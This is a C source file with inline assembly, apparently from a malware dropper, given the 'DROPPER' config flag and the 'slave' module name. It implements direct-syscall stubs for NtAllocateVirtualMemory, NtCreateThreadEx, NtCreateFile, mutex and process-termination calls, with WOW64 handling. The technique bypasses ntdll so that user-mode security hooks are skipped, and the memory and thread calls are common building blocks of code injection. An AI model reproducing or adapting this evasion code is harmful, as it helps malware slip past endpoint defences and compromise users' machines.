#include <config.h>
#include <fastcall.h>
#include <ntapi.h>
#include "ntapi.h"

/*
    003e1148 803d58303e0001  cmp     byte ptr [slave!Config+0x18 (003e3058)],1
    003e114f 7506            jne     slave!NtAllocateVirtualMemory+0xf (003e1157)
    003e1151 ff2500303e00    jmp     dword ptr [slave!NtapiSyscallsAddressStorage (003e3000)]
    003e1157 a100303e00      mov     eax,dword ptr [slave!NtapiSyscallsAddressStorage (003e3000)]
    003e115c 803d46303e0001  cmp     byte ptr [slave!Config+0x6 (003e3046)],1
    003e1163 7408            je      slave!NtAllocateVirtualMemory+0x25 (003e116d)
    003e1165 e8d6ffffff      call    slave!KiFastSystemCall (003e1140)
    003e116a c21800          ret     18h
    003e116d 803d5c303e0000  cmp     byte ptr [slave!Config+0x1c (003e305c)],0
    003e1174 740a            je      slave!NtAllocateVirtualMemory+0x38 (003e1180)
    003e1176 64ff15c0000000  call    dword ptr fs:[0C0h]
    003e117d c21800          ret     18h
    003e1180 33c9            xor     ecx,ecx
    003e1182 8d542404        lea     edx,[esp+4]
    003e1186 64ff15c0000000  call    dword ptr fs:[0C0h]
    003e118d 83c404          add     esp,4
    003e1190 c21800          ret     18h
    003e1193 90              nop
*/

enum {
    Teb32Wow64ReservedOffset = FIELD_OFFSET(TEB32, WOW32Reserved)
};

#if SCFG_DROPPER_NTAPI_INIT_USE_PROCLOAD == ON
    #define NTAPI_STUB_SOURCE(PROCINDEX, ARGSIZE)                                \
        {                                                                        \
            __asm { jmp dword ptr NtapiSyscallsAddressStorage[PROCINDEX << 2] }; \
        }
#else
    /*
        TODO: Optimizie this pile of shit

        75 bytes make it smaller
    */
    #define NTAPI_STUB_SOURCE(PROCINDEX, ARGSIZE)                                     \
        {                                                                             \
            __asm { cmp byte ptr [Config.NtVersion.bIsDeprecated], TRUE            }; \
            __asm { jne L1                                                         }; \
            __asm { jmp dword ptr NtapiSyscallsAddressStorage[PROCINDEX << 2]      }; \
        L1:                                                                           \
            __asm { mov eax, dword ptr NtapiSyscallsAddressStorage[PROCINDEX << 2] }; \
            __asm { cmp byte ptr [Config.Cpu.bUnderWow64], TRUE                    }; \
            __asm { je L2                                                          }; \
            __asm { call KiFastSystemCall                                          }; \
            __asm { ret ARGSIZE                                                    }; \
        L2:                                                                           \
            __asm { cmp byte ptr [Config.NtVersion.dwCommonIndex], 0               }; \
            __asm { je L3                                                          }; \
            __asm { call dword ptr fs:[Teb32Wow64ReservedOffset]                   }; \
            __asm { ret ARGSIZE                                                    }; \
        L3:                                                                           \
            __asm { xor ecx, ecx                                                   }; \
            __asm { lea edx, [esp + 4]                                             }; \
            __asm { call dword ptr fs:[Teb32Wow64ReservedOffset]                   }; \
            __asm { add esp, 4                                                     }; \
            __asm { ret ARGSIZE                                                    }; \
        }
#endif

PRAGMA_WARNING_DISABLE_PUSH(869) // parameter "X" was never referenced

NTSTATUS
NTAPISTUB
NtAllocateVirtualMemory(
    IN HPROCESS  ProcessHandle,
    IO PVOID    *BaseAddress,
    IN ULONG_PTR ZeroBits,
    IO PSIZE_T   RegionSize,
    IN ULONG     AllocationType,
    IN ULONG     Protect
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x18);
}

NTSTATUS
NTAPISTUB
NtFreeVirtualMemory(
    IN HPROCESS ProcessHandle,
    IN PVOID   *BaseAddress,
    IO PSIZE_T  RegionSize,
    IN ULONG    FreeType
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x10);
}

NTSTATUS
NTAPISTUB
NtCreateThreadEx(
    OUT     PHTRHEAD    hThread,
    IN      ACCESS_MASK DesiredAccess,
    IN  OPT POBJECT_ATTRIBUTES ObjectAttributes,
    IN      HPROCESS    ProcessHandle,
    IN      PVOID       StartAddress,
    IN  OPT PVOID       Arguments,
    IN      ULONG       CreateFlags,
    IN      ULONG       StackZeroBits,
    IN      ULONG       SizeOfStackCommit,
    IN      ULONG       SizeOfStackReserve,
    IN  OPT PPS_ATTRIBUTE_LIST AttributeList
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x2C);
}

NTSTATUS
NTAPISTUB
NtCreateFile(
    OUT PHANDLE            FileHandle,
    IN  ACCESS_MASK        DesiredAccess,
    IN  POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK   IoStatusBlock,
    IN  PLARGE_INTEGER     AllocationSize,
    IN  ULONG              FileAttributes,
    IN  ULONG              ShareAccess,
    IN  ULONG              CreateDisposition,
    IN  ULONG              CreateOptions,
    IN  PVOID              EaBuffer,
    IN  ULONG              EaLength
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x2C);
}

NTSTATUS
NTAPISTUB
NtClose(
    IN HANDLE Handle
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x04);
}

NTSTATUS
NTAPISTUB
NtCreateMutant(
    OUT    PHANDLE             MutantHandle,
    IN     ACCESS_MASK         DesiredAccess,
    IN OPT POBJECT_ATTRIBUTES  ObjectAttributes,
    IN     BOOLEAN             InitialOwner
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x10);
}

NTSTATUS
NTAPISTUB
NtOpenMutant(
    OUT PHANDLE            MutantHandle,
    IN  ACCESS_MASK        DesiredAccess,
    IN  POBJECT_ATTRIBUTES ObjectAttributes
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x0C);
    
}

NTSTATUS
NTAPISTUB
NtTerminateProcess(
    IN OPT HANDLE   ProcessHandle,
    IN     NTSTATUS ExitStatus
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x08);
}

NTSTATUS
NTAPI
NtDelayExecution(
    IN BOOLEAN        Alertable,
    IN PLARGE_INTEGER DelayInterval
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x08);
}

PRAGMA_WARNING_DISABLE_POP(869)
